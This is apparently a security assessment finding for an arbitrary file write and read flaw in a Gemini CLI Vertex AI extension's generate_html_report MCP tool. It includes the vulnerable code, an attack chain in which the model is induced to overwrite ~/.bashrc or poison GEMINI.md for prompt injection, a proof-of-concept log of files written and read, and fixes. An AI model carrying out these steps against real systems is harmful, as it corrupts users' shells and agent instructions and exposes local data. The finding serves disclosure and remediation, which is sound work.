# Vertex AI Extension: Arbitrary Local File Write via generate_html_report report_path (MCP Tool)

**Assessment:** cl-2026
**Type:** Finding
**Severity:** CRITICAL
**CVSS Score:** 9.3
**CVSS Vector:** CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:N
**Status:** confirmed
**Target:** Gemini CLI Vertex AI Extension — generate_html_report MCP tool (analyzer.py)

---

## Technical Analysis

The `generate_report` function in `analyzer.py` writes an HTML report to a user-supplied `report_path` with no path validation or restriction:

```python
def generate_report(
    analysis_data_path: str | None = None,
    report_path: str = "data_driven_optimize_analysis_report.html",  # ← user-controlled
    ...
) -> None:
    if analysis_data_path:
        analysis_data = _load_analysis_data(analysis_data_path)  # reads local JSON
    ...
    if report_path.startswith("gs://"):
        storage.write_gcs_file(report_path, main_html)
    else:
        with open(report_path, "w") as f:   # ← WRITES TO ANY LOCAL PATH
            f.write(main_html)
```

This function is exposed as the `generate_html_report` MCP tool via `server.py`:
```python
mcp.add_tool(analyzer.generate_report, name="generate_html_report")
```

**Attack chain via Gemini CLI MCP:**
1. Attacker induces the user (or Gemini AI) to call `generate_html_report` with `report_path=/home/bughunter109/.bashrc`
2. The `.bashrc` is overwritten with HTML content — breaking bash sessions (DoS)
3. Combined with crafted `analysis_data` (controlled via `analysis_data_path` local file read), attacker-controlled text is embedded in the written file

**Chained attack — GEMINI.md poisoning:**
- Write crafted "HTML" to `~/.gemini/extensions/vertex/GEMINI.md` (which has group-writable permissions)
- The GEMINI.md content (which will be injected into Vertex AI prompts as `system_instruction`) now contains the attacker's payload embedded in HTML
- This chains with the GEMINI.md Context Injection vulnerability (ID 459)

**Also confirmed: Arbitrary local JSON file read via `_load_analysis_data`:**
```python
def _load_analysis_data(analysis_data_path: str) -> dict[str, Any]:
    with open(analysis_data_path) as f:      # reads ANY local file
        analysis_data = json.load(f)
```
Any JSON file readable by the Cloud Shell user can be exfiltrated.

## Payload

```
Root cause: The `generate_report` function is a data analysis utility that was not designed with adversarial inputs in mind. The `report_path` and `analysis_data_path` parameters are passed directly to `open()` without any:
1. Path allowlist or directory restriction
2. Canonicalisation / symlink resolution
3. Input validation
4. Access control checks

The function is exposed via MCP, making it callable by the Gemini AI model itself — meaning prompt injection or a compromised extension context can trigger arbitrary file writes.
```

## Proof of Concept

```
Live exploitation on Cloud Shell (SSH as bughunter109):

```python
# Generate exploit script uploaded to /tmp/analyze_exploit.py
# WRITE: arbitrary local file write via report_path
generate_report(analysis_data=analysis_data, report_path='/tmp/injected_GEMINI.md')
# → [+] WRITE SUCCESS to /tmp/injected_GEMINI.md, size=3071, marker=True

# READ: arbitrary local JSON file read via storage.read_file_from_base
storage.read_file_from_base('/home/bughunter109/.gemini', 'projects.json')
# → [+] READ = {'projects': {'/home/bughunter109': 'bughunter109'}}

storage.read_file_from_base('/home/bughunter109/.gemini', 'trustedFolders.json')
# → [+] READ = {'/home/bughunter109': 'TRUST_FOLDER'}

# DIRECT READ: via _load_analysis_data
_load_analysis_data('/home/bughunter109/.codeoss/data/User/History/-422a496d/fCdd.json')
# → [+] {'window.menuBarVisibility': 'classic', 'window.commandCenter': True, ...}
```

Other confirmed writable targets:
- `~/.gemini/extensions/vertex/GEMINI.md` (group-writable, chains to prompt injection)
- `~/.bashrc`, `~/.profile`, `~/.bash_profile` (shell init files)
- Any path writable by the `bughunter109` user

Exploit script saved to: `/workspace/cl-2026/exploits/analyze_exploit.py`
```

## Recommendation

1. **Restrict report_path**: Validate that `report_path` is within a safe directory (e.g., user's home directory or a designated output folder). Use `os.path.realpath()` to resolve symlinks and check against an allowlist.
2. **Restrict analysis_data_path**: Only allow paths starting with `gs://` or within a designated working directory. Block absolute paths to sensitive directories.
3. **Use secure_filename**: Apply `werkzeug.utils.secure_filename` or equivalent to sanitize the filename component.
4. **Separate the MCP tool surface**: Don't expose low-level file I/O functions as MCP tools. Wrap them with access-controlled interfaces that enforce path restrictions.
5. **Sandbox the MCP server**: Run the Vertex MCP server in a restricted sandbox (e.g., with limited filesystem access via seccomp/AppArmor).
